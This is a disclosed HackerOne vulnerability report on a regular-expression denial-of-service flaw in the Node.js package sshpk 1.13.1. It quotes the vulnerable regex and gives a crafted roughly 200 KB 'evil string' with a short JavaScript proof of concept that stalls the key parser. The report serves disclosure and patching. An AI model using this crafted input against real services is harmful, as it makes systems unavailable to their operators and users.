# `sshpk` is vulnerable to ReDoS when parsing crafted invalid public keys

## Report Details
- **Report ID**: 319593
- **URL**: https://hackerone.com/reports/319593
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-02-25T19:14:42.891Z
- **Disclosed**: 2018-04-04T21:26:06.821Z

## Reporter
- **Username**: chalker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a ReDoS in `sshpk`
It allows to cause Denial of Service by trying to parse a crafted public key.

# Module

**module name:** sshpk
**version:** 1.13.1
**npm page:** `https://www.npmjs.com/package/sshpk`

## Module Description

> Parse, convert, fingerprint and use SSH keys (both public and private) in pure node -- no ssh-keygen or other external dependencies.

## Module Stats

320 485 downloads in the last day
4 709 033 downloads in the last week
19 365 516 downloads in the last month

~232 386 192 estimated downloads per year

# Vulnerability

## Vulnerability Description

ReDoS.

- regex: /^([a-z0-9-]+)[ \t]+([a-zA-Z0-9+\/]+[=]*)([\n \t]+([^\n]+))?$/
- evil string: `ssh-rsa a${Array(200000).join(' ')}x\nx` (~200 KB, unwrap js template string)
- file: https://github.com/joyent/node-sshpk/blob/v1.13.1/lib/formats/ssh.js#L17

The testcase uses ~200 KB string to demonstrate long unavailability period, but parsing is also considerably slow on shorter strings.

## Steps To Reproduce:

```js
var keyPub = `ssh-rsa a${Array(200000).join(' ')}x\nx`;
var key = require('sshpk').parseKey(keyPub, 'ssh');
```

## Supporting Material/References:

- Arch Linux Current
- Node.js 9.5.0
- npm 5.6.0

# Wrap up

- I contacted the maintainer to let him know: N 
- I opened an issue in the related repository: N

## Impact

Cause denial of service by parsing a crafted public key file.

## Attachments
No attachments
